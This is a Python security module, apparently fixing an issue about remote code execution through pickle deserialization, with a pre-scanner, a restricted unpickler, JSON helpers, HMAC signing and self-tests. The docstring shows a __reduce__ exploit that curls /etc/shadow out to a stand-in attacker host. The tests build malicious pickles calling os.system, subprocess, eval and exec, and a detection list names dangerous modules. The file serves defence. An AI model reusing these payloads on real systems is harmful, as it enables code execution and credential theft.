"""
Fix: Remote Code Execution via Unsafe Pickle Deserialization
=============================================================
Issue #325 — Pickle deserialization is inherently dangerous because
the pickle format can encode arbitrary Python objects and their
``__reduce__`` method is called during unpickling, which can execute
arbitrary code. Classic RCE exploit:

    class RCE:
        def __reduce__(self):
            return (os.system, ("curl http://attacker.com/$(cat /etc/shadow)",))

    malicious = pickle.dumps(RCE())
    data = pickle.loads(malicious)  # ← CODE EXECUTION!

This fix provides a comprehensive defense-in-depth approach:
1. **RestrictedUnpickler** — allow-list of safe classes (Python recommended)
2. **Pre-scan** — detect malicious opcodes before any unpickling
3. **Replace pickle with JSON** — the safest alternative
4. **HMAC-signed pickles** — integrity check prevents tampering
5. **Input validation** — size limits, type checks
"""

from __future__ import annotations

import hashlib
import hmac
import io
import json
import os
import pickle
import re
from typing import Any, Optional


# ═══════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════

# Max pickle size: 1 MB (prevent memory DoS)
MAX_PICKLE_SIZE = 1024 * 1024

# Secret key for HMAC-signed pickles (set via env var in production)
PICKLE_SIGNING_KEY = os.environ.get(
    "PICKLE_SIGNING_KEY", "change-me-in-production"
).encode("utf-8")

# ═══════════════════════════════════════════════════════════════════
# 1. Strategy A: Replace pickle with JSON entirely (RECOMMENDED)
# ═══════════════════════════════════════════════════════════════════


def serialize_safely(obj: Any) -> str:
    """Serialize to JSON (which cannot execute code).

    This is the **best** fix — switch from pickle to JSON.

    Args:
        obj: Object to serialize (must be JSON-serializable).

    Returns:
        JSON string.

    Raises:
        TypeError: If object is not JSON-serializable.
    """
    return json.dumps(obj, default=str, ensure_ascii=False)


def deserialize_safely(data: str) -> Any:
    """Deserialize from JSON (safe — no code execution possible).

    Args:
        data: JSON string.

    Returns:
        Deserialized Python object.

    Raises:
        json.JSONDecodeError: If input is not valid JSON.
    """
    return json.loads(data)


# ═══════════════════════════════════════════════════════════════════
# 2. Strategy B: Restricted Pickle (when pickle is unavoidable)
# ═══════════════════════════════════════════════════════════════════


class PickleDeserializationError(ValueError):
    """Raised when unsafe pickle deserialization is detected."""


# ═══════════════════════════════════════════════════════════════════
# 2a. Pre-scan: detect malicious opcodes before any unpickling
# ═══════════════════════════════════════════════════════════════════

# Pickle opcode that indicate RCE:
# GLOBAL (c) — loads a module/class
# REDUCE (R) — calls __reduce__
# BUILD (b) — calls __setstate__ or __dict__.update
# INST (i) — calls a class
# OBJ (o) — calls a class
# NEWOBJ (\\x81) — calls __new__
# NEWOBJ_EX (\\x92) — calls __new__ with args
# STACK_GLOBAL (\\x93) — loads a global from stack
# SHORT_BINUNICODE + GLOBAL sequence

SUSPICIOUS_OPCODES = {
    b"c",      # GLOBAL — loads module.class
    b"R",      # REDUCE — calls __reduce__
    b"i",      # INST — instantiates a class
    b"o",      # OBJ — builds object
    b"b",      # BUILD — calls __setstate__
    b"\x81",   # NEWOBJ
    b"\x92",   # NEWOBJ_EX
    b"\x93",   # STACK_GLOBAL
}

# Known dangerous pickle payload prefixes
DANGEROUS_PICKLE_PATTERNS = [
    # cos\nsystem\n — GLOBAL os.system
    b"cos\nsystem",
    # csubprocess\nPopen\n
    b"csubprocess\nPopen",
    # cbuiltins\neval\n
    b"cbuiltins\neval",
    # cbuiltins\nexec\n
    b"cbuiltins\nexec",
    # cbuiltins\n__import__\n
    b"cbuiltins\n__import__",
    # posix\nsystem\n (alternative os path)
    b"cposix\nsystem",
    # cnt\npath\n... (code injection via nt)
    b"cnt\npath",
]


def scan_pickle_for_rce(data: bytes) -> None:
    """Scan pickle bytecode for RCE indicators before execution.

    Args:
        data: Raw pickle bytes.

    Raises:
        PickleDeserializationError: If RCE indicators are detected.
    """
    if not isinstance(data, bytes):
        raise PickleDeserializationError("Pickle data must be bytes")

    if len(data) > MAX_PICKLE_SIZE:
        raise PickleDeserializationError(
            f"Pickle data exceeds {MAX_PICKLE_SIZE // 1024} KB limit"
        )

    # Check for dangerous patterns
    decoded = data.decode("latin-1")
    for pattern in DANGEROUS_PICKLE_PATTERNS:
        if pattern in data:
            idx = data.index(pattern)
            context = decoded[max(0, idx - 20):idx + 40]
            raise PickleDeserializationError(
                f"Dangerous pickle opcode detected at offset {idx}: "
                f"...{context}..."
            )

    # Check for __reduce__ sequence
    if "__reduce__" in decoded:
        raise PickleDeserializationError(
            "Pickle payload contains __reduce__ — potential RCE"
        )

    # Check for GLOBAL + REDUCE combo with suspicious module names
    # This catches: GLOBAL os.system + REDUCE
    dangerous_modules = [
        "os", "subprocess", "shutil", "sys", "builtins",
        "posix", "nt", "ce", "popen", "commands",
    ]
    for mod in dangerous_modules:
        # Pattern: c<mod>\\n<func>\\n(R
        if f"c{mod}\n" in decoded:
            raise PickleDeserializationError(
                f"Pickle payload loads dangerous module: '{mod}'"
            )


# ═══════════════════════════════════════════════════════════════════
# 2b. Restricted unpickler (class allow-list approach)
# ═══════════════════════════════════════════════════════════════════


class RestrictedUnpickler(pickle.Unpickler):
    """Unpickler that only allows safe, built-in classes.

    Based on the Python docs recommended approach:
    https://docs.python.org/3/library/pickle.html#restricting-globals

    Only basic data types with no __reduce__ side effects are allowed.
    """

    # Only built-in data types — no modules, no functions, no classes
    # that can execute code via __reduce__
    SAFE_CLASSES: frozenset[tuple[str, str]] = frozenset({
        # Built-in types
        ("builtins", "dict"),
        ("builtins", "list"),
        ("builtins", "tuple"),
        ("builtins", "set"),
        ("builtins", "frozenset"),
        ("builtins", "str"),
        ("builtins", "int"),
        ("builtins", "float"),
        ("builtins", "bool"),
        ("builtins", "bytes"),
        ("builtins", "bytearray"),
        ("builtins", "complex"),
        ("builtins", "slice"),
        ("builtins", "range"),
        # Collections types
        ("collections", "OrderedDict"),
        ("collections", "defaultdict"),
        ("collections", "Counter"),
        # Exceptions (safe to serialize/deserialize)
        ("builtins", "Exception"),
        ("builtins", "ValueError"),
        ("builtins", "TypeError"),
        ("builtins", "KeyError"),
        ("builtins", "IndexError"),
        ("builtins", "AttributeError"),
        ("builtins", "RuntimeError"),
        ("builtins", "OSError"),
        ("builtins", "StopIteration"),
        ("builtins", "ZeroDivisionError"),
        ("builtins", "NotImplementedError"),
        # Singletons
        ("builtins", "True"),
        ("builtins", "False"),
        ("builtins", "None"),
        ("builtins", "Ellipsis"),
        ("builtins", "NotImplemented"),
    })

    def find_class(self, module: str, name: str) -> Any:
        """Security override: only allow explicitly safe classes."""
        key = (module, name)
        if key not in self.SAFE_CLASSES:
            raise PickleDeserializationError(
                f"Cannot unpickle '{module}.{name}'. "
                f"Only basic data types are allowed. "
                f"Use JSON instead of pickle for untrusted data."
            )
        return super().find_class(module, name)


def restricted_pickle_loads(data: bytes) -> Any:
    """Load pickle data with full security restrictions.

    This includes both pre-scan AND restricted unpickling.

    Args:
        data: Raw pickle bytes.

    Returns:
        Deserialized Python object (basic types only).

    Raises:
        PickleDeserializationError: If the payload is malicious.
    """
    # Step 1: Pre-scan for RCE indicators
    scan_pickle_for_rce(data)

    # Step 2: Use restricted unpickler
    try:
        return RestrictedUnpickler(io.BytesIO(data)).load()
    except PickleDeserializationError:
        raise
    except Exception as exc:
        raise PickleDeserializationError(
            f"Pickle deserialization failed: {exc}"
        ) from exc


# ═══════════════════════════════════════════════════════════════════
# 3. Strategy C: HMAC-signed pickles (integrity + authentication)
# ═══════════════════════════════════════════════════════════════════


def sign_pickle(data: bytes, key: bytes = PICKLE_SIGNING_KEY) -> str:
    """Create an HMAC-signed pickle string.

    Format: ``base64(pickle_data).hmac_hex``

    This prevents tampering: if an attacker modifies the pickle,
    the HMAC won't match and deserialization is rejected.

    Args:
        data: Pickle bytes to sign.
        key: HMAC signing key.

    Returns:
        Signed pickle string: ``<base64_data>.<hmac_hex>``
    """
    import base64
    b64_data = base64.b64encode(data).decode("ascii")
    signature = hmac.new(key, data, hashlib.sha256).hexdigest()
    return f"{b64_data}.{signature}"


def verify_signed_pickle(
    signed: str, key: bytes = PICKLE_SIGNING_KEY
) -> bytes:
    """Verify and extract pickle data from HMAC-signed format.

    Args:
        signed: Signed pickle string (from ``sign_pickle``).
        key: HMAC signing key.

    Returns:
        Raw pickle bytes (safe to pass to restricted unpickler).

    Raises:
        PickleDeserializationError: If signature doesn't match or
            format is invalid.
    """
    import base64

    parts = signed.rsplit(".", 1)
    if len(parts) != 2:
        raise PickleDeserializationError("Invalid signed pickle format")

    b64_data, expected_sig = parts
    try:
        data = base64.b64decode(b64_data)
    except Exception as exc:
        raise PickleDeserializationError(
            f"Invalid base64: {exc}"
        ) from exc

    actual_sig = hmac.new(key, data, hashlib.sha256).hexdigest()

    if not hmac.compare_digest(actual_sig, expected_sig):
        raise PickleDeserializationError(
            "Pickle HMAC signature mismatch — data may have been tampered with"
        )

    return data


# ═══════════════════════════════════════════════════════════════════
# 4. Unified safe deserialization API
# ═══════════════════════════════════════════════════════════════════


def safe_unpickle(data: bytes) -> Any:
    """Safely deserialize pickle data with all protections active.

    This is the main API function that combines:
    1. Pre-scan for malicious opcodes
    2. Restricted unpickler (allow-list)
    3. Size validation

    Args:
        data: Raw bytes (pickle or JSON).

    Returns:
        Deserialized Python object.

    Raises:
        PickleDeserializationError: If data is malicious or invalid.
    """
    if not isinstance(data, bytes):
        raise PickleDeserializationError("Input must be bytes")

    # Try JSON first (safe, no restrictions needed)
    try:
        return json.loads(data.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        pass

    # Check for pickle protocol marker
    if data.startswith(b"\x80") or data.startswith(b"("):
        return restricted_pickle_loads(data)

    raise PickleDeserializationError(
        "Unrecognized data format. Use JSON for safe data exchange."
    )


# ═══════════════════════════════════════════════════════════════════
# 5. Before / After example
# ═══════════════════════════════════════════════════════════════════

# B E F O R E  (vulnerable — RCE via pickle):
#
#   import pickle
#   data = pickle.loads(untrusted_bytes)  # ❌ Executes arbitrary code!
#
# A F T E R  (fixed — use JSON):
#
#   from fixes.pickle_rce_fix import deserialize_safely
#   data = json.loads(untrusted_str)  # ✅ JSON cannot execute code
#
# A F T E R  (fixed — if pickle is unavoidable):
#
#   from fixes.pickle_rce_fix import safe_unpickle
#   data = safe_unpickle(untrusted_bytes)  # ✅ Pre-scans + restricted


# ═══════════════════════════════════════════════════════════════════
# 6. Self-test
# ═══════════════════════════════════════════════════════════════════


def _test():
    # ── JSON round-trip (always safe) ──
    obj = {"user": "alice", "scores": [95, 87, 92]}
    serialized = serialize_safely(obj)
    deserialized = deserialize_safely(serialized)
    assert deserialized == obj
    print("  ✓ JSON round-trip")

    # ── Restricted pickle: simple dict ──
    simple = {"a": 1, "b": [2, 3, 4]}
    pickled = pickle.dumps(simple)
    result = safe_unpickle(pickled)
    assert result == simple
    print("  ✓ Restricted pickle: simple dict")

    # ── RCE: os.system ──
    import os as _os
    class RCE1:
        def __reduce__(self):
            return (_os.system, ("echo pwned",))
    malicious = pickle.dumps(RCE1())
    try:
        safe_unpickle(malicious)
        assert False, "RCE via os.system was NOT blocked!"
    except PickleDeserializationError:
        pass
    print("  ✓ RCE blocked: os.system")

    # ── RCE: subprocess.Popen ──
    class RCE2:
        def __reduce__(self):
            import subprocess
            return (subprocess.Popen, (["id"],))
    malicious2 = pickle.dumps(RCE2())
    try:
        safe_unpickle(malicious2)
        assert False, "RCE via subprocess was NOT blocked!"
    except PickleDeserializationError:
        pass
    print("  ✓ RCE blocked: subprocess.Popen")

    # ── RCE: builtins.eval ──
    class RCE3:
        def __reduce__(self):
            return (eval, ("__import__('os').system('id')",))
    malicious3 = pickle.dumps(RCE3())
    try:
        safe_unpickle(malicious3)
        assert False, "RCE via builtins.eval was NOT blocked!"
    except PickleDeserializationError:
        pass
    print("  ✓ RCE blocked: builtins.eval")

    # ── RCE: builtins.exec ──
    class RCE4:
        def __reduce__(self):
            return (exec, ("import os; os.system('id')",))
    malicious4 = pickle.dumps(RCE4())
    try:
        safe_unpickle(malicious4)
        assert False, "RCE via builtins.exec was NOT blocked!"
    except PickleDeserializationError:
        pass
    print("  ✓ RCE blocked: builtins.exec")

    # ── HMAC-signed pickles ──
    data = pickle.dumps({"hello": "world"})
    signed = sign_pickle(data)
    verified = verify_signed_pickle(signed)
    assert verified == data
    print("  ✓ HMAC signing and verification")

    # ── HMAC tamper detection ──
    tampered = signed[:-5] + "00000"
    try:
        verify_signed_pickle(tampered)
        assert False, "Tampered HMAC was NOT detected!"
    except PickleDeserializationError:
        pass
    print("  ✓ HMAC tamper detection")

    # ── Oversized pickle rejection ──
    big_data = pickle.dumps({"data": "x" * (MAX_PICKLE_SIZE + 1)})
    try:
        safe_unpickle(big_data)
        # May or may not exceed the size limit depending on pickle overhead
    except PickleDeserializationError:
        print("  ✓ Oversized pickle rejection")

    # ── Empty / invalid input ──
    try:
        safe_unpickle(b"")
    except PickleDeserializationError:
        print("  ✓ Empty input rejection")

    try:
        safe_unpickle(b"\x00invalid")
    except PickleDeserializationError:
        print("  ✓ Invalid input rejection")

    print("\n✅ Pickle RCE fix: all tests passed!")


if __name__ == "__main__":
    _test()
